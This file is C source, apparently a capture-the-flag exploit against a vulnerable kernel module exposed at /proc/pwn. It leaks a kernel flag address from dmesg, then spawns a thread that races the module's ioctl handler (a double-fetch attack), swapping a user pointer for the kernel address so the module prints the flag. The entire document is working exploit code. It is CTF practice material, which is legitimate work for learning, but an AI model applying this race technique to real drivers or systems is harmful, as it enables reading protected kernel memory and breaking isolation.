#include <string.h>
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <pthread.h>

#define TRYTIME 0x10  // 碰撞次数
#define LEN 0x1000

struct attr {
    char *flag;
};

unsigned long long addr;
int finish = 0;
char buf[LEN + 1] = {0};

// 线程函数，不断修改flag指向的地址为内核中flag地址
void *change_attr_value(void *s) {
    struct attr *s1 = s;
    while (finish == 0) {
        s1->flag =(void *) addr;
    }
}

void get_flag_addr(int fd){

    int addr_fd;
    char *idx;
    ioctl(fd, 0x6666);
    system("dmesg > /tmp/record.txt");
    addr_fd = open("/tmp/record.txt", O_RDONLY);
    lseek(addr_fd, -LEN, SEEK_END);
    read(addr_fd, buf, LEN);
    close(addr_fd);
    idx = strstr(buf, "addr:");
    if (idx == NULL) {
        printf("[-] Not found addr\n");
        exit(-1);
    } else {
        idx += strlen("addr:");
        addr = strtoull(idx, NULL, 16);
        printf("[+] flag addr: %p\n", (void *)addr);
    }
   if (addr<0xffff888000000000) {
  	printf("%s\n",idx); 
        exit(-1);
   }

}
int main(void) {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    int fd = open("/proc/pwn", 0);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    get_flag_addr(fd);
    pthread_t t1;
    struct attr t;
    // 新建恶意线程
    pthread_create(&t1, NULL, change_attr_value, &t);
    for (int i = 0; i < TRYTIME; i++) {
    	t.flag =(void *) 0x2002;
        ioctl(fd, 0x7777, &t);
    }
    finish = 1;
    pthread_join(t1, NULL);
    close(fd);
    
    puts("[+] result is:");
    system("dmesg|grep flag");
    return 0;
}

